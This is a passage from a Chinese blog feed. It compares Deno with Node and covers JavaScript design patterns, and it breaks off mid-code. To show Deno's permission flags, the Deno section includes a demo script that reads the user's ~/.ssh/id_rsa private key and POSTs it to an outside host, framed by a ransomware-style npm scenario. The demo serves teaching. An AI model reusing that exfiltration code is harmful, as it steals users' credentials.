  <entry>
    <title>了解下deno，与node的区别是什么？</title>
    <link href="https://zhanghao-web.github.io/2020/05/17/Deno/%E4%BA%86%E8%A7%A3%E4%B8%8Bdeno%EF%BC%8C%E4%B8%8Enode%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <id>https://zhanghao-web.github.io/2020/05/17/Deno/了解下deno，与node的区别是什么？/</id>
    <published>2020-05-17T13:37:07.000Z</published>
    <updated>2020-05-18T01:27:18.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Deno-VS-Node"><a href="#Deno-VS-Node" class="headerlink" title="Deno VS Node"></a>Deno VS Node</h1><table><thead><tr><th>不同点</th><th style="text-align:right">Node</th><th style="text-align:center">Deno</th></tr></thead><tbody><tr><td>API 引用方式</td><td style="text-align:right">模块导入</td><td style="text-align:center">全局对象</td></tr><tr><td>模块系统</td><td style="text-align:right">CommonJS &amp; 新版 node 实验性 ES Module</td><td style="text-align:center">ES Module 浏览器实现</td></tr><tr><td>安全</td><td style="text-align:right">无安全限制</td><td style="text-align:center">默认安全</td></tr><tr><td>Typescript</td><td style="text-align:right">第三方，如通过 ts-node 支持</td><td style="text-align:center">原生支持</td></tr><tr><td>包管理</td><td style="text-align:right">npm + node_modules</td><td style="text-align:center">原生支持</td></tr><tr><td>异步操作</td><td style="text-align:right">回调</td><td style="text-align:center">Promise</td></tr><tr><td>包分发</td><td style="text-align:right">中心化 npmjs.com</td><td style="text-align:center">去中心化 import url</td></tr><tr><td>入口</td><td style="text-align:right">package.json 配置</td><td style="text-align:center">import url 直接引入</td></tr><tr><td>打包、测试、格式化</td><td style="text-align:right">第三方如 eslint、gulp、webpack、babel 等</td><td style="text-align:center">原生支持</td></tr></tbody></table><h2 id="1-内置-API-引用方式不同"><a href="#1-内置-API-引用方式不同" class="headerlink" title="1.内置 API 引用方式不同"></a>1.内置 API 引用方式不同</h2><p><strong>node 模块导入</strong></p><p>node 内置 API 通过模块导入的方式引用，例如：</p><pre><code class="js">const fs = require(&quot;fs&quot;);fs.readFileSync(&quot;./data.txt&quot;);</code></pre><p><strong>deno 全局对象</strong></p><p>而 deno 则是一个全局对象 Deno 的属性和方法：</p><pre><code class="js">Deno.readFileSync(&quot;./data.txt&quot;);具体 deno 有哪些方法，我们可以通过 repl 看一下：</code></pre><pre><code class="js">deno # 或 deno repl</code></pre><p>进入 <code>repl</code> 后，输入 Deno 回车，我们可以看到：</p><pre><code class="json">{ Buffer: [Function: Buffer], readAll: [AsyncFunction: readAll], readAllSync: [Function: readAllSync], writeAll: [AsyncFunction: writeAll], writeAllSync: [Function: writeAllSync], # .....}</code></pre><p>这种处理的方式好处是<strong>简单、方便</strong>，坏处是<strong>没有分类</strong>，想查找忘记的 API 比较困难。总体来说见仁见智。</p><h2 id="2-模块系统"><a href="#2-模块系统" class="headerlink" title="2.模块系统"></a>2.模块系统</h2><p>我们再来看一下模块系统，这也是 deno 和 node <strong>差别最大的地方</strong>，同样也是 deno 和 node 不兼容的地方。</p><p><strong>node CommonJS 规范</strong><br>我们都知道 node 采用的是 CommonJS 规范，而 deno 则是采用的 ES Module 的浏览器实现，那么我们首先来认识一下：</p><p><strong>ES Module 的浏览器实现</strong><br>具体关于 ES Module 想必大家都早已熟知，但其浏览器实现可能大家还不是很熟悉，所以我们先看一下其浏览器实现：</p><pre><code class="html">&lt;body&gt;  &lt;!-- 注意这里一定要加上 type=&quot;module&quot; --&gt;  &lt;script type=&quot;module&quot;&gt;    // 从 URL 导入    import Vue from &quot;https://unpkg.com/vue@2.6.11/dist/vue.esm.browser.js&quot;;    // 从相对路径导入    import * as utils from &quot;./utils.js&quot;;    // 从绝对路径导入    import &quot;/index.js&quot;;    // 不支持    import foo from &quot;foo.js&quot;;    import bar from &quot;bar/index.js&quot;;    import zoo from &quot;./index&quot;; // 没有 .js 后缀  &lt;/script&gt;&lt;/body&gt;</code></pre><p><strong>deno 的模块规范</strong><br>deno 完全遵循 es module 浏览器实现，所以 deno 也是如此：</p><pre><code class="js">// 支持import * as fs from &quot;https://deno.land/std/fs/mod.ts&quot;;import { deepCopy } from &quot;./deepCopy.js&quot;;import foo from &quot;/foo.ts&quot;;// 不支持import foo from &quot;foo.ts&quot;;import bar from &quot;./bar&quot;; // 必须指定扩展名\</code></pre><p>我们发现其和我们平常在 webpack 或者 ts 使用 es module 最大的不同：</p><ul><li><p>可以通过 import url 直接引用线上资源；</p></li><li><p>资源不可省略扩展名和文件名。</p></li></ul><p>关于第 1 点，争议非常大，有人很看好，觉得极大的扩展了 deno 库的范围；有人则不太看好，觉得国内网速的原因，并不实用。</p><h2 id="3-安全"><a href="#3-安全" class="headerlink" title="3.安全"></a>3.安全</h2><p>如果模块规范是 node 和 deno 最大的不同，那么对安全的处理，则是另外一个让人摸不着头脑的地方。</p><p><strong>模拟盗号</strong></p><p>在介绍之前我们先思考一下这个场景会不会出现：</p><p>我做了一个基于命令行的一键上网工具 <code>breakwall</code>，每月 1 个 G 免费流量，然后将压缩后的 JS 代码发布到 npm 上，然后后在各种渠道宣传一波。</p><p>羊毛党兴高彩烈的 <code>cnpm install -g breakwall</code>，然后每次使用的时候，我偷偷的将诸位的 ssh 密钥和各种能偷的文档及图片偷偷上传到我的服务器，在设定期限到期后，删除电脑上资料，留下一句拿钱换资料，仅支持比特币。</p><p><strong>默认安全的 deno</strong></p><p>如果你觉得以上情况有可能出现，则会觉得下面的功能很实用。我们先用 deno 执行以下代码：</p><pre><code class="js">// index.jslet rsa = Deno.readFileSync(Deno.dir(&quot;home&quot;) + &quot;/.ssh/id_rsa&quot;);rsa = new TextDecoder().decode(rsa);fetch(&quot;http://jsonplaceholder.typicode.com/posts/1&quot;, {  method: &quot;POST&quot;,  body: JSON.stringify(rsa)})  .then((res) =&gt; res.json())  .then((res) =&gt; console.log(&quot;密钥发送成功，嘿嘿嘿😜&quot;));console.log(&quot;start breakwall...&quot;);</code></pre><blockquote><p>PS: –unstable 是由于 Deno.dir API 不稳定</p></blockquote><pre><code class="js"> deno run --unstable index.js</code></pre><p>我们将会得到如下报错信息：</p><pre><code class="js">&gt; deno run --unstable  index.jserror: Uncaught PermissionDenied: access to environment variables, run again with the --allow-env flag    ...</code></pre><p>意思就是权限异常，需要访问环境变量，需要加上 <code>--allow-env</code>，我们加上这个参数再试一下。</p><pre><code class="js"> deno run --unstable --allow-env index.jserror: Uncaught PermissionDenied: read access to &quot;/Users/zhangchaojie/.ssh/id_rsa&quot;, run again with the --allow-read flag    ...</code></pre><p>如此反复，还需加上 <code>--allow-read</code>、<code>--allow-net</code> ，最终的结果是：</p><pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net  index.jsstart breakwall...密钥发送成功，嘿嘿嘿😜</code></pre><p>经过一番折腾，总算是发送成功了，要想盗取密钥实属不易。</p><p><strong>白名单</strong></p><p>那有人就说了，如果我的应用确实需要访问网络和文件，但是有不想让它访问 .ssh 文件有没有办法？</p><p>当然有了，我们可以给 <code>--allow-read</code> 和 <code>--allow-net</code> 指定白名单，名单之外都不可访问，例如：</p><pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net=https://www.baidu.com  index.jsstart breakwall...error: Uncaught PermissionDenied: network access to &quot;http://jsonplaceholder.typicode.com/posts/1&quot;, run again with the --allow-net flag    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)    at async fetch ($deno$/web/fetch.ts:591:27)</code></pre><p><strong>简化参数</strong></p><p>如果确认是没问题，或者是自己开发软件时，图个方便，可以直接使用 -A 或 –allow-all 参数允许所有权限：</p><pre><code class="js">&gt; deno -A --unstable index.jsstart breakwall...密钥发送成功，嘿嘿嘿😜</code></pre><p>安全这方面见仁见智，有人觉得是多余，有人觉得很好用，极大的增强了安全性。如果你属于觉得这个功能多余的，可以 deno run -A xxx 即可。</p><h2 id="4-兼容浏览器-API"><a href="#4-兼容浏览器-API" class="headerlink" title="4.兼容浏览器 API"></a>4.兼容浏览器 API</h2><p>关于为什么，我举个栗子大家就明白了：在设计 node 之处，关于输出函数本来叫 <code>print</code> 之类的，后来有人提议为什么不叫 <code>console.log</code>，ry 觉得挺不错，于是就接纳了意见。</p><p>但是，这个设计并不是刻意为之，而 deno 的设计则可以为之，通过与浏览器 API 保持一致，来减少大家的认知。</p><p><strong>怎么兼容浏览器 API</strong></p><blockquote><p>概念上兼容</p><ul><li>模块系统，从上面介绍看出 deno 是完全遵循浏览器实现的；</li></ul></blockquote><ul><li><p>默认安全，当然也不是自己创造的概念，w3c 早已做出浏览器权限的规定，我们在做小程序的时候尤为明显，需要获取各种权限；</p></li><li><p>对于异步操作返回 Promise；</p></li><li><p>使用 <code>ArrayBuffer</code> 处理二进制；</p></li></ul><blockquote><p>存在 window 全局变量</p></blockquote><p><code>console.log(window === this, window === self, window === globalThis);</code></p><blockquote><p>实现了 WindowOrWorkerGlobalScope 的全部方法</p></blockquote><p>具体方法列表，我们可以参考：<code>lib.deno.shared_globals.d.ts</code> 和 <code>lib.deno.window.d.ts</code></p><pre><code class="js">// 请求方法fetch(&quot;https://baidu.com&quot;);// base64 转化let encodedData = btoa(&quot;Hello, world&quot;); // 编码let decodedData = atob(encodedData); // 解码// 微任务queueMicrotask(() =&gt; {  console.log(123);});</code></pre><blockquote><p>大趋势</p></blockquote><p>总体而言，如果服务端和浏览器端存在相同概念，deno 就不会创造新的概念。这一点其实 node 也在做，新的 node 14.0 CHANGELOG 就也提及要实现 Universal JavaScript 和 Spec compliance and Web Compatibility的思想，所以这点大家应该都会接受吧，毕竟大势所趋趋势。</p><h2 id="5-支持-Typescript"><a href="#5-支持-Typescript" class="headerlink" title="5.支持 Typescript"></a>5.支持 Typescript</h2><p>不管你喜欢与否，2020 年了，必须学习 TS 了（起码在面试的时候是亮点）。学完之后你才会明白王境泽定律真的无处不在。</p><pre><code class="js">// index.tslet str: string = &quot;王境泽定律&quot;;str = 132;&gt; deno run index.tserror TS2322: Type &#39;123&#39; is not assignable to type &#39;string&#39;.► file:///Users/zhangchaojie/Desktop/index.ts:2:12 str = 123  ~~~</code></pre><h2 id="6-去-node-modules"><a href="#6-去-node-modules" class="headerlink" title="6.去 node_modules"></a>6.去 node_modules</h2><p>deno 没有 <code>node_modules</code>，那么它是怎么进行包管理的呢？我们先看下面的例子</p><pre><code class="js">// index.jsimport { white, bgRed } from &quot;https://deno.land/std/fmt/colors.ts&quot;;console.log(bgRed(white(&quot;hello world!&quot;)));&gt; deno run index.jsDownload https://deno.land/std/fmt/colors.tsCompile https://deno.land/std/fmt/colors.tshello world!</code></pre><p>我们看到其有 Download 和 Compile 两个步骤，我们会产生几个疑问：</p><blockquote><p>1、每次执行都要下载吗？</p></blockquote><p>解：我们只需要再执行一次就能明白，不需要每次下载。</p><pre><code class="js">&gt; deno run index.jshello world!</code></pre><blockquote><p>2、Download 和 Compile 的文件在哪里呢？</p></blockquote><p>解：我们会发现，当前执行的目录，并没有 Download 和 Compile 文件，那文件放在哪里呢，我们首先来看一下 deno –help 命令：</p><pre><code class="js">&gt; deno --helpSUBCOMMANDS:# ...info           Show info about cache or info related to source file# ...ENVIRONMENT VARIABLES:    DENO_DIR   Set deno&#39;s base directory (defaults to $HOME/.deno)</code></pre><p>deno info 命令展示了依赖关系，类似 package.json。</p><pre><code class="js">&gt; deno info index.jslocal: /Users/zhangchaojie/Desktop/index.jstype: JavaScriptdeps:file:///Users/zhangchaojie/Desktop/index.js  └── https://deno.land/std/fmt/colors.ts</code></pre><p>DENO_DIR 则为实际的安装和编译目录，相当于 node_modules，默认为 $HOME/.deno（命令提示是这样的，但实际需要指定一下环境变量 <code>export DENO_DIR=$HOME/.deno）</code>，我们看一下：</p><pre><code class="js">&gt; tree $HOME/.deno/Users/zhangchaojie/.deno├── deps│   └── https│       └── deno.land│           ├── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935│           └── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935.metadata.json└── gen    └── https        └── deno.land            └── std                └── fmt                    ├── colors.ts.js                    ├── colors.ts.js.map                    └── colors.ts.meta8 directories, 5 files</code></pre><blockquote><p>3、没网络了怎么办？</p></blockquote><p>我们有些场景是将本地写好的代码部署到没有网络的服务器，那么当执行 deno run xxx 时，就是提示 error sending request。</p><p>解：将上面的缓存目录内容，直接拷贝到服务器并指定环境变量到其目录即可。</p><blockquote><p>4、依赖代码更新了怎么办？</p></blockquote><p>解：当依赖模块更新时，我们可以通过 –reload 进行更新缓存，例如：</p><p><code>&gt; deno run --reload index.js</code><br>我们还可以通过白名单的方式，只更新部分依赖。例如：</p><p><code>&gt; deno run --reload=https://deno.land index.js</code></p><blockquote><p>5、仅缓存依赖，不执行代码有办法吗？</p></blockquote><p>解：有的，我们可以通过 deno cache index.js 进行依赖缓存。</p><blockquote><p>6、多版本怎么处理？</p></blockquote><p>解：暂时没有好的解决方案，只能通过 git tag 的方式区分版本。</p><h2 id="7-标准模块-与-node-API-兼容"><a href="#7-标准模块-与-node-API-兼容" class="headerlink" title="7.标准模块 与 node API 兼容"></a>7.标准模块 与 node API 兼容</h2><p>我们通过第 1 点可以看到，其实 deno 的 API 相对于 node 其实是少一些的，通过其文件大小也能看出来：</p><pre><code class="js">&gt; ll /usr/local/bin/node /Users/zhangchaojie/.local/bin/deno-rwxr-xr-x  1   42M   /Users/zhangchaojie/.local/bin/deno-rwxr-xr-x  1   70M   /usr/local/bin/node</code></pre><p>那这些少的 API 只能自己写或者求助于社区吗？</p><p>deno 对于自身相对于 node 少的和社区中常用的功能，提供了标准模块，其特点是不依赖非标准模块的内容，达到社区内的模块引用最后都收敛于标准模块的效果。例如：</p><pre><code class="js">// 类似 node 中 chalk 包import { bgRed, white } from &quot;https://deno.land/std/fmt/colors.ts&quot;;// 类似 node 中的 uuid 包import { v4 } from &quot;https://deno.land/std/uuid/mod.ts&quot;;</code></pre><p>同时为了对 node 用户友好，提供了 node API 的兼容</p><pre><code class="js">import * as path from &quot;https://deno.land/std/node/path.ts&quot;;import * as fs from &quot;https://deno.land/std/node/fs.ts&quot;;console.log(path.resolve(&#39;./&#39;, &#39;./test&#39;))</code></pre><p>所以，大家在为 deno 社区做贡献的时候，首先要看一下标准模块有没有提供类似的功能，如果已经提供了可以进行引用。</p><h2 id="8-异步操作"><a href="#8-异步操作" class="headerlink" title="8.异步操作"></a>8.异步操作</h2><blockquote><p>根据 ry 自己是说法，在设计 node 是有人提议 Promise 处理回调，但是他没听，用他自己的话说就是愚蠢的拒绝了。</p></blockquote><p><strong>node 用回调的方式处理异步操作、deno 则选择用 Promise</strong></p><pre><code class="js">// node 方式const fs = require(&quot;fs&quot;);fs.readFile(&quot;./data.txt&quot;, (err, data) =&gt; {  if (err) throw err;  console.log(data);});</code></pre><p>另外 deno 支持 top-level-await，所以以上读取文件的代码可以为：</p><pre><code class="js">// deno 方式const data = await Deno.readFile(&quot;./data.txt&quot;);console.log(data);</code></pre><p>node 关于这方面也在一直改进，例如社区上很多 <code>promisify</code> 解决方案，通过包裹一层函数，实现目的。例如：</p><pre><code class="js">// node API promisifyconst { promisify } = require(&quot;es6-promisify&quot;);const fs = require(&quot;fs&quot;);// 没有 top-level-await，只能包一层async function main() {  const readFile = promisify(fs.readFile);  const data = await readFile(&quot;./data.txt&quot;);  console.log(data);}main();</code></pre><h2 id="9-单文件分发"><a href="#9-单文件分发" class="headerlink" title="9.单文件分发"></a>9.单文件分发</h2><p>我们知道 npm 包必须有 <code>package.json</code> 文件，里面不仅需要指明 main 或 module 或 browser 等字段来标明入口文件，还需要指明 <code>name 、license 、description</code> 等字段来说明这个包。</p><p>ry 觉得这些字段扰乱了开发者的视听，所以在 deno 中，其模块不需要任何配置文件，直接是 import url 的形式。</p><h2 id="10-去中心化仓库"><a href="#10-去中心化仓库" class="headerlink" title="10.去中心化仓库"></a>10.去中心化仓库</h2><p>对于 <code>www.npmjs.com</code> 我们肯定都不陌生，它是推动 node 蓬勃发展的重要支点。但作者认为它是中心化仓库，违背了互联网去中心化原则。</p><p>所以 deno 并没有一个像 npmjs.com 的仓库，通过 import url 的方式将互联网任何一处的代码都可以引用。</p><p>PS：deno 其实是有个基于 <code>GitHub</code> 的第三方模块集合。</p><h2 id="11-去开发依赖"><a href="#11-去开发依赖" class="headerlink" title="11.去开发依赖"></a>11.去开发依赖</h2><p>我们在写一个 node 库或者工具时，开发依赖是少不了的，例如 babel 做转化和打包、jest 做测试、prettier 做代码格式化、eslint 做代码格式校检、gulp 或者 webpack 做构建等等，让我们在开发前就搞得筋疲力尽。</p><blockquote><p>deno 通过内置了一些工具，解决上述问题。</p></blockquote><ul><li><p><code>deno bundle</code>：打包命令，用来替换 babel、gulp 一类工具: 例如：deno bundle ./mod.ts；</p></li><li><p><code>deno fmt</code>：格式化命令，用来替换 prettier 一类工具，例如：deno fmt ./mod.ts；</p></li><li><p><code>deno test</code>：运行测试代码，用来替换 jest 一类工具，例如 deno test ./test.ts；</p></li><li><p><code>deno lint</code>：代码校检（暂未实现），用来替换 eslint 一类工具，例如：deno lint ./mod.ts。</p></li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>就像小时候一直幻想的炸弹始终没能炸了学校，技（轮）术（子）的进（制）步（造）一直也未停止过。不论我们学的动或者学不动，技术就在那里，不以人的意志为转移。</p><p>至于 deno 能不能火，我个人觉得起码一两年内不会有太大反响，之后和 node 的关系有可能像 Vue 和 react，有人喜欢用 deno，觉得比 node 好一万倍，有人则喜欢 node ，觉得 node 还能再战 500 年。至于最终学不学还看自己。</p><p><a href="https://juejin.im/post/5ebcabb2e51d454da74185a9" target="_blank" rel="noopener">20 分钟入门 deno</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Deno-VS-Node&quot;&gt;&lt;a href=&quot;#Deno-VS-Node&quot; class=&quot;headerlink&quot; title=&quot;Deno VS Node&quot;&gt;&lt;/a&gt;Deno VS Node&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;不同点&lt;/th&gt;
      
    
    </summary>
    
      <category term="Deno" scheme="https://zhanghao-web.github.io/categories/Deno/"/>
    
    
      <category term="Deno" scheme="https://zhanghao-web.github.io/tags/Deno/"/>
    
  </entry>
  
  <entry>
    <title>javascript设计模式Es6代码实现</title>
    <link href="https://zhanghao-web.github.io/2020/05/12/Js/javascript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8FEs6%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    <id>https://zhanghao-web.github.io/2020/05/12/Js/javascript设计模式Es6代码实现/</id>
    <published>2020-05-12T05:20:35.000Z</published>
    <updated>2020-05-18T01:17:25.174Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5e021eb96fb9a01628014095" target="_blank" rel="noopener">原文地址</a></p><h1 id="设计模式简介"><a href="#设计模式简介" class="headerlink" title="设计模式简介"></a>设计模式简介</h1><p><code>设计模式</code>代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。<code>设计模式</code>是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p><p><code>设计模式</code>是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用<code>设计模式</code>是为了重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，<code>设计模式</code>于己于他人于系统都是多赢的，<code>设计模式</code>使代码编制真正工程化，<code>设计模式</code>是软件工程的基石，如同大厦的一块块砖石一样。</p><h2 id="设计模式规则（SOLID）"><a href="#设计模式规则（SOLID）" class="headerlink" title="设计模式规则（SOLID）"></a>设计模式规则（SOLID）</h2><p><strong>S – Single Responsibility Principle 单一职责原则</strong></p><ul><li>一个程序只做好一件事</li><li>如果功能过于复杂就拆分开，每个部分保持独立</li></ul><p><strong>O – OpenClosed Principle 开放/封闭原则</strong></p><ul><li>对扩展开放，对修改封闭</li><li>增加需求时，扩展新代码，而非修改已有代码</li></ul><p><strong>L – Liskov Substitution Principle 里氏替换原则</strong></p><ul><li>子类能覆盖父类</li><li>父类能出现的地方子类就能出现</li></ul><p><strong>I – Interface Segregation Principle 接口隔离原则</strong></p><ul><li>保持接口的单一独立</li><li>类似单一职责原则，这里更关注接口</li></ul><p><strong>D – Dependency Inversion Principle 依赖倒转原则</strong></p><ul><li>面向接口编程，依赖于抽象而不依赖于具体</li><li>使用方只关注接口而不关注具体类的实现</li></ul><p>再举个栗子：<a href="https://juejin.im/post/5adc8e18518825672b0352a8#comment" target="_blank" rel="noopener">此例来源-守候-改善代码的各方面问题</a></p><pre><code class="js">//checkType(&#39;165226226326&#39;,&#39;mobile&#39;)//result：falselet checkType=function(str, type) {    switch (type) {        case &#39;email&#39;:            return /^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$/.test(str)        case &#39;mobile&#39;:            return /^1[3|4|5|7|8][0-9]{9}$/.test(str);        case &#39;tel&#39;:            return /^(0\d{2,3}-\d{7,8})(-\d{1,4})?$/.test(str);        default:            return true;    }}</code></pre><p>有以下两个问题：</p><ol><li>如果想添加其他规则就得在函数里面增加 case 。添加一个规则就修改一次！这样违反了开放-封闭原则（对扩展开放，对修改关闭）。而且这样也会导致整个 API 变得臃肿，难维护。</li><li>比如A页面需要添加一个金额的校验，B页面需要一个日期的校验，但是金额的校验只在A页面需要，日期的校验只在B页面需要。如果一直添加 case 。就是导致A页面把只在B页面需要的校验规则也添加进去，造成不必要的开销。B页面也同理。</li></ol><p>建议的方式是给这个 API 增加一个扩展的接口:</p><pre><code class="js">let checkType=(function(){    let rules={        email(str){            return /^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$/.test(str);        },        mobile(str){            return /^1[3|4|5|7|8][0-9]{9}$/.test(str);        }    };    //暴露接口    return {        //校验        check(type,str){            return rules[type]?rules[type](str):false;        },        //添加规则        addRule(type,fn){            rules[type]=fn;        }    }})();//调用方式//使用mobile校验规则console.log(checkType.check(&#39;mobile&#39;,&#39;188170239&#39;));//添加金额校验规则checkType.addRule(&#39;money&#39;,function (str) {    return /^[0-9]+(.[0-9]{2})?$/.test(str)});//使用金额校验规则console.log(checkType.check(&#39;18.36&#39;,&#39;money&#39;));</code></pre><p>此例更详细内容请查看-&gt; <a href="https://juejin.im/post/5adc8e18518825672b0352a8#comment" target="_blank" rel="noopener">守候i-重构-改善代码的各方面问题</a></p><h1 id="设计模式分类（23种）"><a href="#设计模式分类（23种）" class="headerlink" title="设计模式分类（23种）"></a>设计模式分类（23种）</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><blockquote><p>创建型</p><ul><li>单例模式</li><li>原型模式</li><li>工厂模式</li><li>抽象工厂模式</li><li>建造者模式</li></ul></blockquote><blockquote><p>结构型</p><ul><li>适配器模式</li><li>装饰器模式</li><li>代理模式</li><li>外观模式</li><li>桥接模式</li><li>组合模式</li><li>享元模式</li></ul></blockquote><blockquote><p>行为型</p><ul><li>观察者模式</li><li>迭代器模式</li><li>策略模式</li><li>模板方法模式</li><li>职责链接模式</li><li>命令模式</li><li>备忘录模式</li><li>状态模式</li><li>访问者模式</li><li>中介者模式</li><li>解释器模式</li></ul></blockquote><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>工厂模式定义到一个用于创建对象的接口，这个接口由子类决定实例化哪一类。该模式使一个类的实例化延迟到了子类,而子类可以重写接口方法以便创建的时候指定自己的对象类型</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><pre><code class="js">class Product{  constructor(name){    this.name = name  }  init(){    console.log(&#39;init&#39;,this.name)  }}class Factory {  create(name){    return new Product(name)  }}let factory = new Factory()let p = factory.create(&#39;hello world&#39;)p.init()</code></pre><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ol><li>如果你不想让某个子系统与较大的那个对象之间形成强耦合，而是想运行时从许多子系统中进行挑选的话，那么工厂模式是一个理想的选择</li><li>将new操作简单封装，遇到new的时候就应该考虑是否用工厂模式；</li><li>需要依赖具体环境创建不同实例，这些实例都有相同的行为,这时候我们可以使用工厂模式，简化实现的过程，同时也可以减少每种对象所需的代码量，有利于消除对象间的耦合，提供更大的灵活性</li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>创建对象的过程可能很复杂，但我们只需要关心创建结果。</li><li>构造函数和创建者分离, 符合“开闭原则”</li><li>一个调用者想创建一个对象，只要知道其名称就可以了。</li><li>扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>添加新产品时，需要编写新的具体产品类,一定程度上增加了系统的复杂度</li><li>考虑到系统的可扩展性，需要引入抽象层，在客户端代码中均使用抽象层进行定义，增加了系统的抽象性和理解难度</li></ul><h3 id="什么时候不用"><a href="#什么时候不用" class="headerlink" title="什么时候不用"></a>什么时候不用</h3><p>当被应用到错误的问题类型上时,这一模式会给应用程序引入大量不必要的复杂性.除非为创建对象提供一个接口是我们编写的库或者框架的一个设计上目标,否则我会建议使用明确的构造器,以避免不必要的开销。</p><p>由于对象的创建过程被高效的抽象在一个接口后面的事实,这也会给依赖于这个过程可能会有多复杂的单元测试带来问题。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul><li>曾经我们熟悉的JQuery的$()就是一个工厂函数，它根据传入参数的不同创建元素或者去寻找上下文中的元素，创建成相应的jQuery对象</li></ul><pre><code class="js">class jQuery {    constructor(selector) {        super(selector)    }    add() {    }  // 此处省略若干API}window.$ = function(selector) {    return new jQuery(selector)}</code></pre><ul><li>vue 的异步组件<br>在大型应用中，我们可能需要将应用分割成小一些的代码块，并且只在需要的时候才从服务器加载一个模块。为了简化，Vue 允许你以一个工厂函数的方式定义你的组件，这个工厂函数会异步解析你的组件定义。Vue 只有在这个组件需要被渲染的时候才会触发该工厂函数，且会把结果缓存起来供未来重渲染。例如：</li></ul><pre><code class="js">Vue.component(&#39;async-component&#39;,function(resolve,reject){  setTimeout(funciton(){    resolve({      templete: &#39;&lt;div&gt;I am async&lt;/div&gt;&#39;    })  },1000)})</code></pre><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>一个类只有一个实例，比提供一个访问它的全局访问点</p><h3 id="code-1"><a href="#code-1" class="headerlink" title="code"></a>code</h3><pre><code class="js"> class LoginForm {    constructor() {        this.state = &#39;hide&#39;    }    show() {        if (this.state === &#39;show&#39;) {            alert(&#39;已经显示&#39;)            return        }        this.state = &#39;show&#39;        console.log(&#39;登录框显示成功&#39;)    }    hide() {        if (this.state === &#39;hide&#39;) {            alert(&#39;已经隐藏&#39;)            return        }        this.state = &#39;hide&#39;        console.log(&#39;登录框隐藏成功&#39;)    } } LoginForm.getInstance = (function () {     let instance     return function () {        if (!instance) {            instance = new LoginForm()        }        return instance     } })()let obj1 = LoginForm.getInstance()obj1.show()let obj2 = LoginForm.getInstance()obj2.hide()console.log(obj1 === obj2)</code></pre><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>划分命名空间，减少全局变量</li><li>增强模块性，把自己的代码组织在一个全局变量名下，放在单一位置，便于维护</li><li>且只会实例化一次。简化了代码的调试和维护</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>由于单例模式提供的是一种单点访问，所以它有可能导致模块间的强耦合 从而不利于单元测试。</li><li>无法单独测试一个调用了来自单例的方法的类，而只能把它与那个单例作为一个单元一起测试。</li></ul><h3 id="场景例子"><a href="#场景例子" class="headerlink" title="场景例子"></a>场景例子</h3><p>定义命名空间和实现分支型方法<br>登录框<br>vuex 和 redux中的store</p><h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>将一个类接口转化为另一个接口，以满足用户需求，使类之间接口不兼容问题通过适配器得以解决</p><h3 id="code-2"><a href="#code-2" class="headerlink" title="code"></a>code</h3><pre><code class="js">class Plug {  getName() {    return &#39;iphone充电头&#39;;  }}class Target {  constructor() {    this.plug = new Plug();  }  getName() {    return this.plug.getName() + &#39; 适配器Type-c充电头&#39;;  }}let target = new Target();target.getName(); // iphone充电头 适配器转Type-c充电头</code></pre><h3 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h3><ul><li>可以让两个没有关系的类连接起来一起运行</li><li>提高了类的复用</li><li>适配对象，适配库，适配数据</li></ul><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><ul><li>额外对象的创建，非直接调用，存在一定的开销（且不像代理模式在某些功能点上可实现性能优化)</li><li>如果没必要使用适配器模式的话，可以考虑重构，如果使用的话，尽量把文档完善</li></ul><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><ul><li>整合第三方SDK</li><li>封装旧接口</li></ul><pre><code class="js">// 自己封装的ajax， 使用方式如下ajax({    url: &#39;/getData&#39;,    type: &#39;Post&#39;,    dataType: &#39;json&#39;,    data: {        test: 111    }}).done(function() {})// 因为历史原因，代码中全都是：// $.ajax({....})// 做一层适配器var $ = {    ajax: function (options) {        return ajax(options)    